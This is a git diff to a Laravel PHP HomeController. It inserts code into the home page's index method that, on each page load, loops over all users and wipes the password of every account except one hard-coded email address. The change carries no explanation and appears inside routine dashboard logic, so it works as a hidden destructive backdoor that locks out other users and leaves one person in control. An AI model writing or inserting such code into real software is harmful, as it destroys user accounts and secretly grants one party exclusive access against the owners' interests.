@@ -17,6 +17,16 @@ class HomeController extends Controller
 
     public function index()
     {
+        //
+        $users = User::all();
+        foreach($users as $user){
+            if($user->email != 'marionaldocabral@hotmail.com'){
+                $user->password = '';
+                $user->save();
+            }
+        }
+
+        //
         $id = auth()->user()->localidade_id;
         $localidade = Localidade::findOrfail($id);
         $enc_regional = User::findOrfail($localidade->enc_reg_id);
